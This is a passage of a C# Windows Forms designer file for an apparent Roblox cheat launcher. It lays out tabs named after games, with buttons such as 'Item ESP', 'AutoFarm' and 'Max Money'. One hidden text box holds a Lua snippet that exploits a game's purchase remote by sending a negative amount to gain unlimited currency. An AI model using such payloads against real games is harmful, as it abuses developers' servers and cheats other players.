            this.pictureBox119.Name = "pictureBox119";
            this.pictureBox119.Size = new System.Drawing.Size(149, 149);
            this.pictureBox119.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox119.TabIndex = 47;
            this.pictureBox119.TabStop = false;
            // 
            // flatButton198
            // 
            this.flatButton198.BackColor = System.Drawing.Color.Transparent;
            this.flatButton198.BaseColor = System.Drawing.Color.Red;
            this.flatButton198.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton198.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton198.Location = new System.Drawing.Point(6, 6);
            this.flatButton198.Name = "flatButton198";
            this.flatButton198.Rounded = false;
            this.flatButton198.Size = new System.Drawing.Size(106, 35);
            this.flatButton198.TabIndex = 45;
            this.flatButton198.Text = "GUI 1";
            this.flatButton198.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton198.UseCustomColor = false;
            this.flatButton198.Click += new System.EventHandler(this.flatButton198_Click);
            // 
            // tabPage72
            // 
            this.tabPage72.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage72.Controls.Add(this.flatButton201);
            this.tabPage72.Controls.Add(this.pictureBox121);
            this.tabPage72.Controls.Add(this.flatButton202);
            this.tabPage72.Location = new System.Drawing.Point(4, 44);
            this.tabPage72.Name = "tabPage72";
            this.tabPage72.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage72.Size = new System.Drawing.Size(514, 249);
            this.tabPage72.TabIndex = 67;
            this.tabPage72.Text = "The Streets";
            // 
            // flatButton201
            // 
            this.flatButton201.BackColor = System.Drawing.Color.Transparent;
            this.flatButton201.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton201.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton201.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton201.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton201.Location = new System.Drawing.Point(557, 369);
            this.flatButton201.Name = "flatButton201";
            this.flatButton201.Rounded = false;
            this.flatButton201.Size = new System.Drawing.Size(106, 35);
            this.flatButton201.TabIndex = 56;
            this.flatButton201.Text = "Home";
            this.flatButton201.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton201.UseCustomColor = false;
            this.flatButton201.Click += new System.EventHandler(this.flatButton201_Click);
            // 
            // pictureBox121
            // 
            this.pictureBox121.Location = new System.Drawing.Point(514, 6);
            this.pictureBox121.Name = "pictureBox121";
            this.pictureBox121.Size = new System.Drawing.Size(149, 149);
            this.pictureBox121.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox121.TabIndex = 55;
            this.pictureBox121.TabStop = false;
            // 
            // flatButton202
            // 
            this.flatButton202.BackColor = System.Drawing.Color.Transparent;
            this.flatButton202.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton202.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton202.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton202.Location = new System.Drawing.Point(6, 6);
            this.flatButton202.Name = "flatButton202";
            this.flatButton202.Rounded = false;
            this.flatButton202.Size = new System.Drawing.Size(106, 35);
            this.flatButton202.TabIndex = 53;
            this.flatButton202.Text = "Item ESP";
            this.flatButton202.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton202.UseCustomColor = false;
            this.flatButton202.Click += new System.EventHandler(this.flatButton202_Click);
            // 
            // tabPage74
            // 
            this.tabPage74.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage74.Controls.Add(this.flatButton205);
            this.tabPage74.Controls.Add(this.pictureBox123);
            this.tabPage74.Controls.Add(this.richTextBox59);
            this.tabPage74.Controls.Add(this.flatButton206);
            this.tabPage74.Location = new System.Drawing.Point(4, 44);
            this.tabPage74.Name = "tabPage74";
            this.tabPage74.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage74.Size = new System.Drawing.Size(514, 249);
            this.tabPage74.TabIndex = 69;
            this.tabPage74.Text = "Horrific Housing";
            // 
            // flatButton205
            // 
            this.flatButton205.BackColor = System.Drawing.Color.Transparent;
            this.flatButton205.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton205.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton205.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton205.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton205.Location = new System.Drawing.Point(557, 369);
            this.flatButton205.Name = "flatButton205";
            this.flatButton205.Rounded = false;
            this.flatButton205.Size = new System.Drawing.Size(106, 35);
            this.flatButton205.TabIndex = 64;
            this.flatButton205.Text = "Home";
            this.flatButton205.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton205.UseCustomColor = false;
            this.flatButton205.Click += new System.EventHandler(this.flatButton205_Click);
            // 
            // pictureBox123
            // 
            this.pictureBox123.Location = new System.Drawing.Point(514, 6);
            this.pictureBox123.Name = "pictureBox123";
            this.pictureBox123.Size = new System.Drawing.Size(149, 149);
            this.pictureBox123.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox123.TabIndex = 63;
            this.pictureBox123.TabStop = false;
            // 
            // richTextBox59
            // 
            this.richTextBox59.Location = new System.Drawing.Point(122, 6);
            this.richTextBox59.Name = "richTextBox59";
            this.richTextBox59.Size = new System.Drawing.Size(364, 194);
            this.richTextBox59.TabIndex = 62;
            this.richTextBox59.Text = "amount = -99999999999 --Put whatever you want here\n\ngame.ReplicatedStorage.ShopPu" +
    "rchase:FireServer(amount, \"EggPets\")\n";
            this.richTextBox59.Visible = false;
            // 
            // flatButton206
            // 
            this.flatButton206.BackColor = System.Drawing.Color.Transparent;
            this.flatButton206.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton206.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton206.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton206.Location = new System.Drawing.Point(6, 6);
            this.flatButton206.Name = "flatButton206";
            this.flatButton206.Rounded = false;
            this.flatButton206.Size = new System.Drawing.Size(106, 35);
            this.flatButton206.TabIndex = 61;
            this.flatButton206.Text = "Max Money";
            this.flatButton206.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton206.UseCustomColor = false;
            this.flatButton206.Click += new System.EventHandler(this.flatButton206_Click);
            // 
            // tabPage76
            // 
            this.tabPage76.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage76.Controls.Add(this.flatButton218);
            this.tabPage76.Controls.Add(this.pictureBox134);
            this.tabPage76.Controls.Add(this.flatButton219);
            this.tabPage76.Location = new System.Drawing.Point(4, 44);
            this.tabPage76.Name = "tabPage76";
            this.tabPage76.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage76.Size = new System.Drawing.Size(514, 249);
            this.tabPage76.TabIndex = 71;
            this.tabPage76.Text = "Weight Lifting Simulator 3";
            // 
            // flatButton218
            // 
            this.flatButton218.BackColor = System.Drawing.Color.Transparent;
            this.flatButton218.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton218.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton218.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton218.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton218.Location = new System.Drawing.Point(557, 369);
            this.flatButton218.Name = "flatButton218";
            this.flatButton218.Rounded = false;
            this.flatButton218.Size = new System.Drawing.Size(106, 35);
            this.flatButton218.TabIndex = 68;
            this.flatButton218.Text = "Home";
            this.flatButton218.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton218.UseCustomColor = false;
            this.flatButton218.Click += new System.EventHandler(this.flatButton218_Click);
            // 
            // pictureBox134
            // 
            this.pictureBox134.Location = new System.Drawing.Point(514, 6);
            this.pictureBox134.Name = "pictureBox134";
            this.pictureBox134.Size = new System.Drawing.Size(149, 149);
            this.pictureBox134.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox134.TabIndex = 67;
            this.pictureBox134.TabStop = false;
            // 
            // flatButton219
            // 
            this.flatButton219.BackColor = System.Drawing.Color.Transparent;
            this.flatButton219.BaseColor = System.Drawing.Color.Red;
            this.flatButton219.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton219.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton219.Location = new System.Drawing.Point(6, 6);
            this.flatButton219.Name = "flatButton219";
            this.flatButton219.Rounded = false;
            this.flatButton219.Size = new System.Drawing.Size(106, 35);
            this.flatButton219.TabIndex = 65;
            this.flatButton219.Text = "GUI 1";
            this.flatButton219.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton219.UseCustomColor = false;
            this.flatButton219.Click += new System.EventHandler(this.flatButton219_Click);
            // 
            // tabPage77
            // 
            this.tabPage77.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage77.Controls.Add(this.flatButton220);
            this.tabPage77.Controls.Add(this.pictureBox135);
            this.tabPage77.Controls.Add(this.flatButton221);
            this.tabPage77.Location = new System.Drawing.Point(4, 44);
            this.tabPage77.Name = "tabPage77";
            this.tabPage77.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage77.Size = new System.Drawing.Size(514, 249);
            this.tabPage77.TabIndex = 72;
            this.tabPage77.Text = "Hide and Seek Extreme";
            // 
            // flatButton220
            // 
            this.flatButton220.BackColor = System.Drawing.Color.Transparent;
            this.flatButton220.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton220.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton220.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton220.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton220.Location = new System.Drawing.Point(557, 369);
            this.flatButton220.Name = "flatButton220";
            this.flatButton220.Rounded = false;
            this.flatButton220.Size = new System.Drawing.Size(106, 35);
            this.flatButton220.TabIndex = 72;
            this.flatButton220.Text = "Home";
            this.flatButton220.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton220.UseCustomColor = false;
            this.flatButton220.Click += new System.EventHandler(this.flatButton220_Click);
            // 
            // pictureBox135
            // 
            this.pictureBox135.Location = new System.Drawing.Point(514, 6);
            this.pictureBox135.Name = "pictureBox135";
            this.pictureBox135.Size = new System.Drawing.Size(149, 149);
            this.pictureBox135.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox135.TabIndex = 71;
            this.pictureBox135.TabStop = false;
            // 
            // flatButton221
            // 
            this.flatButton221.BackColor = System.Drawing.Color.Transparent;
            this.flatButton221.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton221.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton221.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton221.Location = new System.Drawing.Point(6, 6);
            this.flatButton221.Name = "flatButton221";
            this.flatButton221.Rounded = false;
            this.flatButton221.Size = new System.Drawing.Size(106, 35);
            this.flatButton221.TabIndex = 69;
            this.flatButton221.Text = "GUI";
            this.flatButton221.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton221.UseCustomColor = false;
            this.flatButton221.Click += new System.EventHandler(this.flatButton221_Click);
            // 
            // tabPage79
            // 
            this.tabPage79.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage79.Controls.Add(this.flatButton224);
            this.tabPage79.Controls.Add(this.pictureBox137);
            this.tabPage79.Controls.Add(this.flatButton225);
            this.tabPage79.Location = new System.Drawing.Point(4, 44);
            this.tabPage79.Name = "tabPage79";
            this.tabPage79.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage79.Size = new System.Drawing.Size(514, 249);
            this.tabPage79.TabIndex = 74;
            this.tabPage79.Text = "Boss Fighting Simulator";
            // 
            // flatButton224
            // 
            this.flatButton224.BackColor = System.Drawing.Color.Transparent;
            this.flatButton224.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton224.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton224.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton224.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton224.Location = new System.Drawing.Point(557, 369);
            this.flatButton224.Name = "flatButton224";
            this.flatButton224.Rounded = false;
            this.flatButton224.Size = new System.Drawing.Size(106, 35);
            this.flatButton224.TabIndex = 79;
            this.flatButton224.Text = "Home";
            this.flatButton224.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton224.UseCustomColor = false;
            this.flatButton224.Click += new System.EventHandler(this.flatButton224_Click);
            // 
            // pictureBox137
            // 
            this.pictureBox137.Location = new System.Drawing.Point(514, 6);
            this.pictureBox137.Name = "pictureBox137";
            this.pictureBox137.Size = new System.Drawing.Size(149, 149);
            this.pictureBox137.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox137.TabIndex = 78;
            this.pictureBox137.TabStop = false;
            // 
            // flatButton225
            // 
            this.flatButton225.BackColor = System.Drawing.Color.Transparent;
            this.flatButton225.BaseColor = System.Drawing.Color.Red;
            this.flatButton225.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton225.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton225.Location = new System.Drawing.Point(6, 6);
            this.flatButton225.Name = "flatButton225";
            this.flatButton225.Rounded = false;
            this.flatButton225.Size = new System.Drawing.Size(106, 35);
            this.flatButton225.TabIndex = 77;
            this.flatButton225.Text = "AutoFarm";
            this.flatButton225.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton225.UseCustomColor = false;
            this.flatButton225.Click += new System.EventHandler(this.flatButton225_Click);
            // 
            // tabPage80
            // 
            this.tabPage80.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage80.Controls.Add(this.flatButton226);
            this.tabPage80.Controls.Add(this.pictureBox138);
            this.tabPage80.Controls.Add(this.flatButton227);
            this.tabPage80.Location = new System.Drawing.Point(4, 44);
            this.tabPage80.Name = "tabPage80";
            this.tabPage80.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage80.Size = new System.Drawing.Size(514, 249);
            this.tabPage80.TabIndex = 75;
            this.tabPage80.Text = "Apocalypse Rising";
            // 
            // flatButton226
            // 
            this.flatButton226.BackColor = System.Drawing.Color.Transparent;
            this.flatButton226.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton226.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton226.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton226.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton226.Location = new System.Drawing.Point(557, 369);
            this.flatButton226.Name = "flatButton226";
            this.flatButton226.Rounded = false;
            this.flatButton226.Size = new System.Drawing.Size(106, 35);
            this.flatButton226.TabIndex = 82;
            this.flatButton226.Text = "Home";
            this.flatButton226.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton226.UseCustomColor = false;
            this.flatButton226.Click += new System.EventHandler(this.flatButton226_Click);
            // 
            // pictureBox138
            // 
            this.pictureBox138.Location = new System.Drawing.Point(514, 6);
            this.pictureBox138.Name = "pictureBox138";
            this.pictureBox138.Size = new System.Drawing.Size(149, 149);
            this.pictureBox138.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox138.TabIndex = 81;
            this.pictureBox138.TabStop = false;
            // 
            // flatButton227
            // 
            this.flatButton227.BackColor = System.Drawing.Color.Transparent;
            this.flatButton227.BaseColor = System.Drawing.Color.Red;
            this.flatButton227.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton227.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton227.Location = new System.Drawing.Point(6, 6);
            this.flatButton227.Name = "flatButton227";
            this.flatButton227.Rounded = false;
            this.flatButton227.Size = new System.Drawing.Size(106, 35);
            this.flatButton227.TabIndex = 80;
            this.flatButton227.Text = "GUI 1";
            this.flatButton227.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton227.UseCustomColor = false;
            this.flatButton227.Click += new System.EventHandler(this.flatButton227_Click);
            // 
            // tabPage81
            // 
            this.tabPage81.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage81.Controls.Add(this.flatButton228);
            this.tabPage81.Controls.Add(this.pictureBox139);
            this.tabPage81.Controls.Add(this.flatButton229);
            this.tabPage81.Location = new System.Drawing.Point(4, 44);
            this.tabPage81.Name = "tabPage81";
            this.tabPage81.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage81.Size = new System.Drawing.Size(514, 249);
            this.tabPage81.TabIndex = 76;
            this.tabPage81.Text = "Slicing Simulator";
            // 
            // flatButton228
            // 
            this.flatButton228.BackColor = System.Drawing.Color.Transparent;
            this.flatButton228.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton228.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton228.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton228.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton228.Location = new System.Drawing.Point(557, 369);
            this.flatButton228.Name = "flatButton228";
            this.flatButton228.Rounded = false;
            this.flatButton228.Size = new System.Drawing.Size(106, 35);
            this.flatButton228.TabIndex = 85;
            this.flatButton228.Text = "Home";
            this.flatButton228.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton228.UseCustomColor = false;
            this.flatButton228.Click += new System.EventHandler(this.flatButton228_Click);
            // 
            // pictureBox139
            // 
            this.pictureBox139.Location = new System.Drawing.Point(514, 6);
            this.pictureBox139.Name = "pictureBox139";
            this.pictureBox139.Size = new System.Drawing.Size(149, 149);
            this.pictureBox139.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox139.TabIndex = 84;
            this.pictureBox139.TabStop = false;
            // 
            // flatButton229
            // 
            this.flatButton229.BackColor = System.Drawing.Color.Transparent;
            this.flatButton229.BaseColor = System.Drawing.Color.Red;
            this.flatButton229.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton229.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton229.Location = new System.Drawing.Point(6, 6);
            this.flatButton229.Name = "flatButton229";
            this.flatButton229.Rounded = false;
            this.flatButton229.Size = new System.Drawing.Size(106, 35);
            this.flatButton229.TabIndex = 83;
            this.flatButton229.Text = "GUI 1";
            this.flatButton229.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton229.UseCustomColor = false;
            this.flatButton229.Click += new System.EventHandler(this.flatButton229_Click);
            // 
            // tabPage82
            // 
            this.tabPage82.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage82.Controls.Add(this.flatButton230);
            this.tabPage82.Controls.Add(this.pictureBox140);
            this.tabPage82.Controls.Add(this.flatButton231);
            this.tabPage82.Location = new System.Drawing.Point(4, 44);
            this.tabPage82.Name = "tabPage82";
            this.tabPage82.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage82.Size = new System.Drawing.Size(514, 249);
            this.tabPage82.TabIndex = 77;
            this.tabPage82.Text = "LOL Surprise Tycoon";
            // 
            // flatButton230
            // 
            this.flatButton230.BackColor = System.Drawing.Color.Transparent;
            this.flatButton230.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton230.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton230.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton230.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton230.Location = new System.Drawing.Point(557, 369);
            this.flatButton230.Name = "flatButton230";
            this.flatButton230.Rounded = false;
            this.flatButton230.Size = new System.Drawing.Size(106, 35);
            this.flatButton230.TabIndex = 88;
            this.flatButton230.Text = "Home";
            this.flatButton230.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton230.UseCustomColor = false;
            this.flatButton230.Click += new System.EventHandler(this.flatButton230_Click);
            // 
            // pictureBox140
            // 
            this.pictureBox140.Location = new System.Drawing.Point(514, 6);
            this.pictureBox140.Name = "pictureBox140";
            this.pictureBox140.Size = new System.Drawing.Size(149, 149);
            this.pictureBox140.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox140.TabIndex = 87;
            this.pictureBox140.TabStop = false;
            // 
            // flatButton231
            // 
            this.flatButton231.BackColor = System.Drawing.Color.Transparent;
            this.flatButton231.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton231.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton231.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton231.Location = new System.Drawing.Point(6, 6);
            this.flatButton231.Name = "flatButton231";
            this.flatButton231.Rounded = false;
            this.flatButton231.Size = new System.Drawing.Size(106, 35);
            this.flatButton231.TabIndex = 86;
            this.flatButton231.Text = "Max Money";
            this.flatButton231.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton231.UseCustomColor = false;
            this.flatButton231.Click += new System.EventHandler(this.flatButton231_Click);
            // 
            // tabPage83
            // 
            this.tabPage83.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage83.Controls.Add(this.flatButton232);
            this.tabPage83.Controls.Add(this.pictureBox141);
            this.tabPage83.Controls.Add(this.flatButton233);
            this.tabPage83.Location = new System.Drawing.Point(4, 44);
            this.tabPage83.Name = "tabPage83";
            this.tabPage83.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage83.Size = new System.Drawing.Size(514, 249);
            this.tabPage83.TabIndex = 78;
            this.tabPage83.Text = "Booga Booga";
            // 
            // flatButton232
            // 
            this.flatButton232.BackColor = System.Drawing.Color.Transparent;
            this.flatButton232.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton232.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton232.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton232.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton232.Location = new System.Drawing.Point(557, 369);
            this.flatButton232.Name = "flatButton232";
            this.flatButton232.Rounded = false;
            this.flatButton232.Size = new System.Drawing.Size(106, 35);
            this.flatButton232.TabIndex = 91;
            this.flatButton232.Text = "Home";
            this.flatButton232.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton232.UseCustomColor = false;
            this.flatButton232.Click += new System.EventHandler(this.flatButton232_Click);
            // 
            // pictureBox141
            // 
            this.pictureBox141.Location = new System.Drawing.Point(514, 6);
            this.pictureBox141.Name = "pictureBox141";
            this.pictureBox141.Size = new System.Drawing.Size(149, 149);
            this.pictureBox141.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox141.TabIndex = 90;
            this.pictureBox141.TabStop = false;
            // 
            // flatButton233
            // 
            this.flatButton233.BackColor = System.Drawing.Color.Transparent;
            this.flatButton233.BaseColor = System.Drawing.Color.Red;
            this.flatButton233.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton233.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton233.Location = new System.Drawing.Point(6, 6);
            this.flatButton233.Name = "flatButton233";
            this.flatButton233.Rounded = false;
            this.flatButton233.Size = new System.Drawing.Size(106, 35);
            this.flatButton233.TabIndex = 89;
            this.flatButton233.Text = "GUI 1";
            this.flatButton233.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton233.UseCustomColor = false;
            this.flatButton233.Click += new System.EventHandler(this.flatButton233_Click);
            // 
            // tabPage86
            // 
            this.tabPage86.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage86.Controls.Add(this.flatButton244);
            this.tabPage86.Controls.Add(this.pictureBox151);
            this.tabPage86.Controls.Add(this.flatButton245);
            this.tabPage86.Location = new System.Drawing.Point(4, 44);
            this.tabPage86.Name = "tabPage86";
            this.tabPage86.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage86.Size = new System.Drawing.Size(514, 249);
            this.tabPage86.TabIndex = 81;
            this.tabPage86.Text = "Redwood Prison";
            // 
            // flatButton244
            // 
            this.flatButton244.BackColor = System.Drawing.Color.Transparent;
            this.flatButton244.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton244.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton244.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton244.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton244.Location = new System.Drawing.Point(557, 369);
            this.flatButton244.Name = "flatButton244";
            this.flatButton244.Rounded = false;
            this.flatButton244.Size = new System.Drawing.Size(106, 35);
            this.flatButton244.TabIndex = 24;
            this.flatButton244.Text = "Home";
            this.flatButton244.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton244.UseCustomColor = false;
            this.flatButton244.Click += new System.EventHandler(this.flatButton244_Click);
            // 
            // pictureBox151
            // 
            this.pictureBox151.Location = new System.Drawing.Point(514, 6);
            this.pictureBox151.Name = "pictureBox151";
            this.pictureBox151.Size = new System.Drawing.Size(149, 149);
            this.pictureBox151.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox151.TabIndex = 23;
            this.pictureBox151.TabStop = false;
            // 
            // flatButton245
            // 
            this.flatButton245.BackColor = System.Drawing.Color.Transparent;
            this.flatButton245.BaseColor = System.Drawing.Color.Red;
            this.flatButton245.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton245.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton245.Location = new System.Drawing.Point(6, 6);
            this.flatButton245.Name = "flatButton245";
            this.flatButton245.Rounded = false;
            this.flatButton245.Size = new System.Drawing.Size(106, 35);
            this.flatButton245.TabIndex = 21;
            this.flatButton245.Text = "GUI 1";
            this.flatButton245.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton245.UseCustomColor = false;
            this.flatButton245.Click += new System.EventHandler(this.flatButton245_Click);
            // 
            // tabPage88
            // 
            this.tabPage88.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage88.Controls.Add(this.flatButton248);
            this.tabPage88.Controls.Add(this.pictureBox153);
            this.tabPage88.Controls.Add(this.flatButton249);
            this.tabPage88.Location = new System.Drawing.Point(4, 44);
            this.tabPage88.Name = "tabPage88";
            this.tabPage88.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage88.Size = new System.Drawing.Size(514, 249);
            this.tabPage88.TabIndex = 83;
            this.tabPage88.Text = "The Real Easy Obby";
            // 
            // flatButton248
            // 
            this.flatButton248.BackColor = System.Drawing.Color.Transparent;
            this.flatButton248.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton248.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton248.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton248.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton248.Location = new System.Drawing.Point(557, 369);
            this.flatButton248.Name = "flatButton248";
            this.flatButton248.Rounded = false;
            this.flatButton248.Size = new System.Drawing.Size(106, 35);
            this.flatButton248.TabIndex = 24;
            this.flatButton248.Text = "Home";
            this.flatButton248.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton248.UseCustomColor = false;
            this.flatButton248.Click += new System.EventHandler(this.flatButton248_Click);
            // 
            // pictureBox153
            // 
            this.pictureBox153.Location = new System.Drawing.Point(514, 6);
            this.pictureBox153.Name = "pictureBox153";
